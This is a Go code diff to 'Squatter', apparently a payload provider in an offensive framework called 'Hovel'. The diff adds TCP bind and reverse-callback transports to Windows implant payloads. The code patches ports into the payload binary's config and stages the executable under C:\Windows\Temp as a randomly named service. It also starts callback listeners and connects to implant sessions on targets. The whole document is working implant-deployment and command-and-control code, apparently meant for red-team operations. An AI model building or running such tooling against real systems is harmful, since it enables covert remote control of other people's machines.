@@ -44,6 +44,7 @@ const (
 	payloadConfigPipeCharacters = 128
 	payloadConfigKindReverseTCP = 1
 	payloadConfigKindSMBPipe    = 2
+	payloadConfigKindTCPBind    = 3
 )
 
 // Provider implements Hovel's payload_provider contract for Squatter.
@@ -76,10 +77,11 @@ func (Provider) Info() hovel.Info {
 func (Provider) Schema() hovel.Schema {
 	return hovel.Schema{
 		ChainConfig: []hovel.Requirement{
-			enumReq("payload.transport", "Payload transport.", reverseTCP, smbNamedPipe),
+			enumReq("payload.transport", "Payload transport.", tcpBind, tcpCallback, smbNamedPipe, reverseTCP),
 			enumReq("payload.format", "Payload artifact format.", formatPEEXE),
-			hovel.Req("payload.lhost", "host", "Reverse TCP listener host."),
-			hovel.Req("payload.lport", "port", "Reverse TCP listener port."),
+			hovel.Req("payload.lhost", "host", "TCP callback listener host."),
+			hovel.Req("payload.lport", "port", "TCP callback listener port."),
+			hovel.Req("payload.bind_port", "port", "TCP bind port opened by the payload on the target."),
 			hovel.Req("payload.pipe", "string", "SMB named pipe for post-throw Squatter comms."),
 		},
 		Outputs: map[string]any{
@@ -191,6 +193,17 @@ func (Provider) DescribeSteps() (hovel.StepContractSet, error) {
 				},
 				Prepare: hovel.StepPrepareContract{Materializes: []string{"staged_path", "service_name"}},
 			},
+			{
+				ID:   "squatter.connect_tcp_callback",
+				Kind: "session.connector",
+				Requires: []hovel.CapabilityRequirement{
+					capabilityWithStates(hovel.CapabilityPayloadInstance, map[string]any{"provider": payloadName, "transport": tcpCallback}, "installed", "disconnected", "installed_unconnected"),
+					capability(hovel.CapabilityTransport, map[string]any{"kind": "tcp-listener"}),
+				},
+				Produces: []hovel.CapabilityRequirement{
+					capability(hovel.CapabilitySessionRef, map[string]any{"provider": payloadName, "transport": tcpCallback}),
+				},
+			},
 		},
 	}, nil
 }
@@ -212,6 +225,15 @@ func (Provider) PrepareStep(req hovel.StepPrepareRequest) (hovel.StepPrepareResu
 	if req.StepID == "squatter.install_smb" {
 		return prepareSMBInstall(req)
 	}
+	if req.StepID == "squatter.install_tcp_bind" {
+		return prepareTCPBindInstall(req)
+	}
+	if req.StepID == "squatter.listen_tcp_callback" {
+		return prepareTCPCallbackListener(req)
+	}
+	if req.StepID == "squatter.install_tcp_callback" {
+		return prepareTCPCallbackInstall(req)
+	}
 	return hovel.StepPrepareResult{
 		PreparedValues: map[string]hovel.PreparedValue{},
 		OperatorSummary: hovel.OperatorSummary{
@@ -225,6 +247,174 @@ func (Provider) PrepareStep(req hovel.StepPrepareRequest) (hovel.StepPrepareResu
 			Message:      "squatter step preparation is not implemented yet",
 		}},
 	}, nil
+}
+
+func prepareTCPBindInstall(req hovel.StepPrepareRequest) (hovel.StepPrepareResult, error) {
+	stagedPath, serviceName, err := preparedInstallNames(req)
+	if err != nil {
+		return hovel.StepPrepareResult{}, err
+	}
+	bindPort, err := preparedString(req.ExistingPreparedValues, "bind_port", func() (string, error) {
+		if port, ok := stringConfig(req.Config, "payload.bind_port"); ok && port != "" {
+			return port, nil
+		}
+		return "9100", nil
+	})
+	if err != nil {
+		return hovel.StepPrepareResult{}, err
+	}
+	return hovel.StepPrepareResult{
+		PlannedOutputs: []hovel.Capability{
+			payloadInstanceCapability(req.StepID, tcpBind, "cap_payload_instance_tcp_bind_"+serviceName, stagedPath, serviceName),
+			{
+				ID:             "cap_endpoint_tcp_bind_" + serviceName,
+				Type:           hovel.CapabilityTransport,
+				SchemaVersion:  "v1",
+				State:          "planned",
+				ProducerStepID: req.StepID,
+				Attributes: map[string]any{
+					"kind": "tcp-endpoint",
+					"port": bindPort,
+				},
+			},
+			cleanupCapability(req.StepID, "cap_cleanup_"+serviceName, stagedPath, serviceName),
+		},
+		PreparedValues: map[string]hovel.PreparedValue{
+			"staged_path":  {Value: stagedPath, Editable: true},
+			"service_name": {Value: serviceName, Editable: true},
+			"bind_port":    {Value: bindPort, Editable: true},
+		},
+		OperatorSummary: hovel.OperatorSummary{
+			TargetSideArtifacts: []string{
+				stagedPath,
+				"service " + serviceName,
+				"TCP bind port " + bindPort,
+			},
+		},
+	}, nil
+}
+
+func prepareTCPCallbackListener(req hovel.StepPrepareRequest) (hovel.StepPrepareResult, error) {
+	host, _ := stringConfig(req.Config, "payload.lhost")
+	if host == "" {
+		host = "127.0.0.1"
+	}
+	port, _ := stringConfig(req.Config, "payload.lport")
+	if port == "" {
+		port = "0"
+	}
+	return hovel.StepPrepareResult{
+		PlannedOutputs: []hovel.Capability{
+			{
+				ID:             "cap_listener_tcp_callback_" + sanitizeCapabilitySuffix(host+"_"+port),
+				Type:           hovel.CapabilityTransport,
+				SchemaVersion:  "v1",
+				State:          "planned",
+				ProducerStepID: req.StepID,
+				Attributes: map[string]any{
+					"kind": "tcp-listener",
+					"host": host,
+					"port": port,
+				},
+			},
+		},
+		PreparedValues: map[string]hovel.PreparedValue{
+			"listen_host": {Value: host, Editable: true},
+			"listen_port": {Value: port, Editable: true},
+		},
+		OperatorSummary: hovel.OperatorSummary{
+			TargetSideArtifacts: []string{"callback to " + net.JoinHostPort(host, port)},
+		},
+	}, nil
+}
+
+func prepareTCPCallbackInstall(req hovel.StepPrepareRequest) (hovel.StepPrepareResult, error) {
+	stagedPath, serviceName, err := preparedInstallNames(req)
+	if err != nil {
+		return hovel.StepPrepareResult{}, err
+	}
+	return hovel.StepPrepareResult{
+		PlannedOutputs: []hovel.Capability{
+			payloadInstanceCapability(req.StepID, tcpCallback, "cap_payload_instance_tcp_callback_"+serviceName, stagedPath, serviceName),
+			cleanupCapability(req.StepID, "cap_cleanup_"+serviceName, stagedPath, serviceName),
+		},
+		PreparedValues: map[string]hovel.PreparedValue{
+			"staged_path":  {Value: stagedPath, Editable: true},
+			"service_name": {Value: serviceName, Editable: true},
+		},
+		OperatorSummary: hovel.OperatorSummary{
+			TargetSideArtifacts: []string{
+				stagedPath,
+				"service " + serviceName,
+				"TCP callback",
+			},
+		},
+	}, nil
+}
+
+func preparedInstallNames(req hovel.StepPrepareRequest) (string, string, error) {
+	stagedPath, err := preparedString(req.ExistingPreparedValues, "staged_path", func() (string, error) {
+		token, err := randomToken(6)
+		if err != nil {
+			return "", err
+		}
+		return `C:\Windows\Temp\` + token + ".exe", nil
+	})
+	if err != nil {
+		return "", "", err
+	}
+	serviceName, err := preparedString(req.ExistingPreparedValues, "service_name", func() (string, error) {
+		return randomToken(5)
+	})
+	if err != nil {
+		return "", "", err
+	}
+	return stagedPath, serviceName, nil
+}
+
+func payloadInstanceCapability(stepID, transport, id, stagedPath, serviceName string) hovel.Capability {
+	return hovel.Capability{
+		ID:             id,
+		Type:           hovel.CapabilityPayloadInstance,
+		SchemaVersion:  "v1",
+		State:          "planned",
+		ProducerStepID: stepID,
+		Attributes: map[string]any{
+			"provider":     payloadName,
+			"transport":    transport,
+			"staged_path":  stagedPath,
+			"service_name": serviceName,
+		},
+	}
+}
+
+func cleanupCapability(stepID, id, stagedPath, serviceName string) hovel.Capability {
+	return hovel.Capability{
+		ID:             id,
+		Type:           hovel.CapabilityCleanupHandle,
+		SchemaVersion:  "v1",
+		State:          "planned",
+		ProducerStepID: stepID,
+		Attributes: map[string]any{
+			"owner":        payloadName,
+			"staged_path":  stagedPath,
+			"service_name": serviceName,
+		},
+	}
+}
+
+func stringConfig(values map[string]any, key string) (string, bool) {
+	value, ok := values[key]
+	if !ok {
+		return "", false
+	}
+	text, ok := value.(string)
+	return text, ok
+}
+
+func sanitizeCapabilitySuffix(value string) string {
+	replacer := strings.NewReplacer(":", "_", ".", "_", "/", "_", "\\", "_", "[", "_", "]", "_")
+	return replacer.Replace(value)
 }
 
 func prepareSMBInstall(req hovel.StepPrepareRequest) (hovel.StepPrepareResult, error) {
@@ -324,7 +514,17 @@ func randomToken(byteCount int) (string, error) {
 	return hex.EncodeToString(buf), nil
 }
 
-func (Provider) ExecuteStep(req hovel.StepExecuteRequest) (hovel.StepExecuteResult, error) {
+func (p Provider) ExecuteStep(req hovel.StepExecuteRequest) (hovel.StepExecuteResult, error) {
+	switch req.StepID {
+	case "squatter.listen_tcp_callback":
+		return p.executeTCPCallbackListen(req)
+	case "squatter.connect_tcp_bind":
+		return p.executeTCPConnect(req, tcpBind)
+	case "squatter.connect_tcp_callback":
+		return p.executeTCPConnect(req, tcpCallback)
+	case "squatter.connect_smb":
+		return p.executeSMBConnect(req)
+	}
 	return hovel.StepExecuteResult{
 		Status: "failed",
 		Evidence: []hovel.Evidence{{
@@ -335,6 +535,186 @@ func (Provider) ExecuteStep(req hovel.StepExecuteRequest) (hovel.StepExecuteResu
 			Message:      "squatter step execution is not implemented yet",
 		}},
 	}, nil
+}
+
+func (p Provider) executeTCPCallbackListen(req hovel.StepExecuteRequest) (hovel.StepExecuteResult, error) {
+	config := stringMapFromAny(req.RunMetadata["config"])
+	target := firstNonEmpty(config["target.host"], "target")
+	listener, err := p.PrepareListener(hovel.PrepareListenerRequest{
+		RunID:     req.RunID,
+		Target:    target,
+		PayloadID: "squatter/windows/x86/windows-7/tcp-callback/pe-exe",
+		Config:    config,
+	})
+	if err != nil {
+		return hovel.StepExecuteResult{
+			Status: "listener_failed",
+			Evidence: []hovel.Evidence{{
+				ID:           "ev_squatter_tcp_callback_listen_failed",
+				Level:        "warning",
+				Kind:         "listener.start.failed",
+				SourceStepID: req.StepID,
+				Message:      "Squatter TCP callback listener failed",
+				Details:      map[string]any{"error": err.Error()},
+			}},
+		}, nil
+	}
+	return hovel.StepExecuteResult{
+		Status: "succeeded",
+		Capabilities: []hovel.Capability{{
+			ID:             "cap_listener_" + sanitizeCapabilitySuffix(listener.ID),
+			Type:           hovel.CapabilityTransport,
+			SchemaVersion:  "v1",
+			State:          "active",
+			ProducerStepID: req.StepID,
+			Attributes: map[string]any{
+				"kind":       "tcp-listener",
+				"listenerId": listener.ID,
+				"host":       listener.Host,
+				"port":       strconv.Itoa(listener.Port),
+				"transport":  tcpCallback,
+			},
+		}},
+		Evidence: []hovel.Evidence{{
+			ID:           "ev_squatter_tcp_callback_listening",
+			Level:        "info",
+			Kind:         "listener.start",
+			SourceStepID: req.StepID,
+			Message:      "Squatter TCP callback listener started",
+			Details: map[string]any{
+				"listenerId": listener.ID,
+				"address":    net.JoinHostPort(listener.Host, strconv.Itoa(listener.Port)),
+			},
+		}},
+	}, nil
+}
+
+func (p Provider) executeTCPConnect(req hovel.StepExecuteRequest, transport string) (hovel.StepExecuteResult, error) {
+	config := stringMapFromAny(req.RunMetadata["config"])
+	if config == nil {
+		config = map[string]string{}
+	}
+	config["payload.transport"] = transport
+	target := firstNonEmpty(config["target.host"], config["tcp.host"], config["smb.host"])
+	session, err := p.ConnectSession(hovel.ConnectSessionRequest{
+		RunID:     req.RunID,
+		Target:    target,
+		PayloadID: "squatter/windows/x86/windows-7/" + transport + "/pe-exe",
+		Config:    config,
+	})
+	if err != nil {
+		return hovel.StepExecuteResult{
+			Status: "installed_unconnected",
+			Evidence: []hovel.Evidence{{
+				ID:           "ev_squatter_" + strings.ReplaceAll(transport, "-", "_") + "_connect_failed",
+				Level:        "warning",
+				Kind:         "session.connect.failed",
+				SourceStepID: req.StepID,
+				Message:      "Squatter " + transport + " session connection failed",
+				Details:      map[string]any{"error": err.Error()},
+			}},
+		}, nil
+	}
+	state := "active"
+	if session.State != "open" {
+		state = session.State
+	}
+	return hovel.StepExecuteResult{
+		Status: "succeeded",
+		Capabilities: []hovel.Capability{{
+			ID:             "cap_session_" + session.ID,
+			Type:           hovel.CapabilitySessionRef,
+			SchemaVersion:  "v1",
+			State:          state,
+			ProducerStepID: req.StepID,
+			Attributes: map[string]any{
+				"provider":  payloadName,
+				"transport": transport,
+				"sessionId": session.ID,
+				"target":    session.Target,
+			},
+		}},
+		Evidence: []hovel.Evidence{{
+			ID:           "ev_squatter_" + strings.ReplaceAll(transport, "-", "_") + "_connect",
+			Level:        "info",
+			Kind:         "session.connect",
+			SourceStepID: req.StepID,
+			Message:      "Squatter " + transport + " session connected",
+			Details: map[string]any{
+				"sessionId": session.ID,
+				"target":    session.Target,
+				"transport": session.Transport,
+				"state":     session.State,
+			},
+		}},
+	}, nil
+}
+
+func (p Provider) executeSMBConnect(req hovel.StepExecuteRequest) (hovel.StepExecuteResult, error) {
+	config := stringMapFromAny(req.RunMetadata["config"])
+	session, err := p.ConnectSession(hovel.ConnectSessionRequest{
+		RunID:     req.RunID,
+		Target:    firstNonEmpty(config["target.host"], config["smb.host"]),
+		PayloadID: "squatter/windows/x86/windows-7/smb-named-pipe/pe-exe",
+		Config:    config,
+	})
+	if err != nil {
+		return hovel.StepExecuteResult{
+			Status: "installed_unconnected",
+			Evidence: []hovel.Evidence{{
+				ID:           "ev_squatter_connect_smb_failed",
+				Level:        "warning",
+				Kind:         "session.connect.failed",
+				SourceStepID: req.StepID,
+				Message:      "Squatter SMB session connection failed",
+				Details: map[string]any{
+					"error": err.Error(),
+				},
+			}},
+		}, nil
+	}
+	return hovel.StepExecuteResult{
+		Status: "succeeded",
+		Capabilities: []hovel.Capability{{
+			ID:             "cap_session_" + session.ID,
+			Type:           hovel.CapabilitySessionRef,
+			SchemaVersion:  "v1",
+			State:          "active",
+			ProducerStepID: req.StepID,
+			Attributes: map[string]any{
+				"provider":  payloadName,
+				"transport": smbNamedPipe,
+				"sessionId": session.ID,
+				"target":    session.Target,
+			},
+		}},
+		Evidence: []hovel.Evidence{{
+			ID:           "ev_squatter_connect_smb_open",
+			Level:        "info",
+			Kind:         "session.connect",
+			SourceStepID: req.StepID,
+			Message:      "Squatter SMB session connected",
+			Details: map[string]any{
+				"sessionId": session.ID,
+				"target":    session.Target,
+				"transport": session.Transport,
+			},
+		}},
+	}, nil
+}
+
+func stringMapFromAny(value any) map[string]string {
+	object, ok := value.(map[string]any)
+	if !ok {
+		return nil
+	}
+	out := make(map[string]string, len(object))
+	for key, item := range object {
+		if text, ok := item.(string); ok {
+			out[key] = text
+		}
+	}
+	return out
 }
 
 func (Provider) CleanupStep(req hovel.StepCleanupRequest) (hovel.StepCleanupResult, error) {
@@ -354,11 +734,12 @@ func (Provider) ListPayloads(query hovel.PayloadQuery) ([]hovel.PayloadInfo, err
 	transport := query.Transport
 	if transport == "" {
 		return []hovel.PayloadInfo{
-			payloadInfo(reverseTCP),
+			payloadInfo(tcpBind),
+			payloadInfo(tcpCallback),
 			payloadInfo(smbNamedPipe),
 		}, nil
 	}
-	return []hovel.PayloadInfo{payloadInfo(transport)}, nil
+	return []hovel.PayloadInfo{payloadInfo(canonicalTransport(transport))}, nil
 }
 
 func (Provider) ResolvePayload(query hovel.PayloadQuery) (hovel.PayloadInfo, error) {
@@ -366,7 +747,7 @@ func (Provider) ResolvePayload(query hovel.PayloadQuery) (hovel.PayloadInfo, err
 	if transport == "" {
 		return hovel.PayloadInfo{}, fmt.Errorf("payload transport is required")
 	}
-	return payloadInfo(transport), nil
+	return payloadInfo(canonicalTransport(transport)), nil
 }
 
 func (p Provider) PrepareListener(req hovel.PrepareListenerRequest) (hovel.ListenerRef, error) {
@@ -411,19 +792,38 @@ func patchPayloadConfig(body []byte, req hovel.GeneratePayloadRequest) error {
 	if transport == "" {
 		if strings.Contains(req.PayloadID, "/"+smbNamedPipe+"/") {
 			transport = smbNamedPipe
+		} else if strings.Contains(req.PayloadID, "/"+tcpBind+"/") {
+			transport = tcpBind
 		} else {
-			transport = reverseTCP
+			transport = tcpCallback
 		}
 	}
+	transport = canonicalTransport(transport)
 
 	switch transport {
-	case reverseTCP:
+	case tcpCallback:
 		return patchReverseTCPConfig(body[offset:], req)
+	case tcpBind:
+		return patchTCPBindConfig(body[offset:], req)
 	case smbNamedPipe:
 		return patchNamedPipeConfig(body[offset:], req)
 	default:
 		return fmt.Errorf("unsupported squatter transport %q", transport)
 	}
+}
+
+func patchTCPBindConfig(config []byte, req hovel.GeneratePayloadRequest) error {
+	portText := firstNonEmpty(req.Config["payload.bind_port"], req.Config["payload.port"])
+	if portText == "" {
+		portText = "9100"
+	}
+	port, err := strconv.Atoi(portText)
+	if err != nil || port < 1 || port > 65535 {
+		return fmt.Errorf("payload.bind_port must be a TCP port: %q", portText)
+	}
+	binary.LittleEndian.PutUint32(config[payloadConfigKindOffset:], payloadConfigKindTCPBind)
+	binary.LittleEndian.PutUint16(config[payloadConfigPortOffset:], uint16(port))
+	return nil
 }
 
 func patchReverseTCPConfig(config []byte, req hovel.GeneratePayloadRequest) error {
@@ -555,6 +955,7 @@ func (Provider) ReadPayloadChunk(req hovel.ReadPayloadChunkRequest) (hovel.Paylo
 }
 
 func payloadInfo(transport string) hovel.PayloadInfo {
+	transport = canonicalTransport(transport)
 	info := hovel.PayloadInfo{
 		ID:           fmt.Sprintf("squatter/%s/%s/%s/%s/%s", platform, arch, minOS, transport, formatPEEXE),
 		Name:         payloadName,
@@ -575,14 +976,24 @@ func payloadInfo(transport string) hovel.PayloadInfo {
 		},
 	}
 	switch transport {
-	case reverseTCP:
+	case tcpCallback:
 		info.Session.Acquisition = "callback"
 		info.Session.RequiresPreThrowListener = true
+	case tcpBind:
+		info.Session.Acquisition = "post_throw_connect"
+		info.Session.RequiresPostThrowConnect = true
 	case smbNamedPipe:
 		info.Session.Acquisition = "post_throw_connect"
 		info.Session.RequiresPostThrowConnect = true
 	}
 	return info
+}
+
+func canonicalTransport(transport string) string {
+	if transport == reverseTCP {
+		return tcpCallback
+	}
+	return transport
 }
 
 func capabilities() []string {
